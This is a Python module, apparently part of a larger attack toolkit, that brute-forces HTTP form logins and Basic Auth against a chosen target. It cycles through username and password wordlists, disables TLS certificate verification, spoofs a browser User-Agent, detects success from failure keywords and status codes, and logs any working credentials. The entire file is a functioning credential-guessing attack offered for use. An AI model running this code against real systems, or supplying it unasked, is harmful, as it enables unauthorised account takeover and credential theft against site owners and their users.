"""
HTTP Brute Force — form login and Basic Auth.
Detects success via response-length delta / redirect / no-failure keywords.
"""
import base64
import http.client
import ssl

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig, CredentialMode, load_wordlist
from modules.attacks.common import save_result, apply_delay


FAIL_KEYWORDS = (
    "invalid", "incorrect", "wrong", "failed", "failure",
    "denied", "error", "unauthorized", "bad credentials",
)


def _try_form(host, port, tls, path, method, uf, pf, user, pw):
    try:
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=8, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=8)

        from urllib.parse import urlencode
        data = urlencode({uf: user, pf: pw})
        headers = {"Content-Type": "application/x-www-form-urlencoded",
                   "User-Agent": "Mozilla/5.0"}

        if method == "GET":
            sep = "&" if "?" in path else "?"
            conn.request("GET", f"{path}{sep}{data}", headers=headers)
        else:
            conn.request("POST", path, body=data, headers=headers)

        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        status = resp.status
        conn.close()

        if status in (200, 302) and not any(k in body.lower() for k in FAIL_KEYWORDS):
            return True
    except Exception:
        pass
    return False


def _try_basic(host, port, tls, path, user, pw):
    try:
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=8, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=8)
        token = base64.b64encode(f"{user}:{pw}".encode()).decode()
        conn.request("GET", path, headers={
            "Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0",
        })
        resp = conn.getresponse()
        resp.read()
        ok = resp.status == 200
        conn.close()
        return ok
    except Exception:
        return False


def run(target: TargetInfo, config: AttackConfig) -> None:
    users = (load_wordlist(config.username_file)
             if config.username_mode == CredentialMode.RANDOM_FROM_LIST
             else [config.username_value])
    passwords = (load_wordlist(config.password_file)
                 if config.password_mode == CredentialMode.RANDOM_FROM_LIST
                 else [config.password_value])

    console.print(
        f"\n[bold primary][ HTTP BRUTE FORCE ][/bold primary]\n"
        f"  [muted]Target   :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [muted]Path     :[/muted] [text]{config.http_path}[/text]\n"
        f"  [muted]Method   :[/muted] [text]{config.http_method}[/text]\n"
        f"  [muted]Users    :[/muted] [text]{len(users)}[/text]\n"
        f"  [muted]Passwords:[/muted] [text]{len(passwords)}[/text]\n"
    )

    found = False
    for u in users:
        for p in passwords:
            ok = _try_form(
                target.host, target.port, config.http_use_tls,
                config.http_path, config.http_method,
                config.http_username_field, config.http_password_field,
                u, p,
            )
            if not ok:
                ok = _try_basic(
                    target.host, target.port, config.http_use_tls,
                    config.http_path, u, p,
                )
            if ok:
                save_result(target.host, target.port, u, p,
                            config.log_file, "http")
                found = True
                break
            apply_delay(config.delay)
        if found:
            break

    if not found:
        console.print("[error]✗ No HTTP credentials found.[/error]")